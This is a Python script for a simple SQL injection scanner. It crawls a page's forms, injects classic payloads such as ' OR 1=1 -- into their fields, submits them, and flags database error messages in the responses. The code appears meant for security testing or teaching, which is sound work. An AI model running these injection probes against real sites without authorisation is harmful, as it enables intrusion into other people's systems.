import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# 1. The Crawler: Finds forms on the page
def get_forms(url):
    """Downloads the page and finds all HTML forms."""
    try:
        content = requests.get(url, timeout=5).content
    except Exception as e:
        return [] # Return empty if site is down
        
    soup = BeautifulSoup(content, "html.parser")
    return soup.find_all("form")

# 2. The Extractor: Understands how to fill the form
def get_form_details(form):
    """Extracts action, method, and input fields from a form."""
    details = {}
    
    # Get the target URL (action)
    action = form.attrs.get("action", "").lower()
    
    # Get the method (POST or GET)
    method = form.attrs.get("method", "get").lower()
    
    # Get all input fields (User, Pass, etc.)
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        # FIX: We now explicitly get the value, defaulting to empty string if missing
        input_value = input_tag.attrs.get("value", "")
        
        inputs.append({
            "type": input_type, 
            "name": input_name,
            "value": input_value
        })
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# 3. The Attacker: Tests for SQL Injection
def scan_sql_injection(url):
    """
    Injects SQL payloads into forms to see if the server breaks.
    Returns: A string description of the vulnerability if found, else None.
    """
    # These symbols often break poorly secured databases
    payloads = ["'", "\"", "' OR 1=1 --", "' OR '1'='1"] 
    forms = get_forms(url)
    
    if not forms:
        return None

    for form in forms:
        form_details = get_form_details(form)
        
        for payload in payloads:
            # Prepare the data to send
            data = {}
            for input_tag in form_details["inputs"]:
                # SKIP inputs with no name (submit buttons often have no name)
                if not input_tag["name"]:
                    continue
                    
                # FIX: specific logic for hidden fields vs text fields
                if input_tag["type"] == "hidden" or input_tag.get("value"):
                    try:
                        data[input_tag["name"]] = input_tag["value"] + payload
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # Inject the payload into text fields
                    data[input_tag["name"]] = f"test{payload}"
            
            # Construct the full URL
            target_url = urljoin(url, form_details["action"])
            
            # Send the attack!
            try:
                if form_details["method"] == "post":
                    res = requests.post(target_url, data=data, timeout=3)
                else:
                    res = requests.get(target_url, params=data, timeout=3)
            except:
                continue

            # 4. The Analyzer: Did we break it?
            # If we see database errors in the text, we win.
            if "mysql" in res.text.lower() or "syntax error" in res.text.lower():
                return f"SQL Injection detected on {target_url} (Payload: {payload})"
    
    return None # Target is secure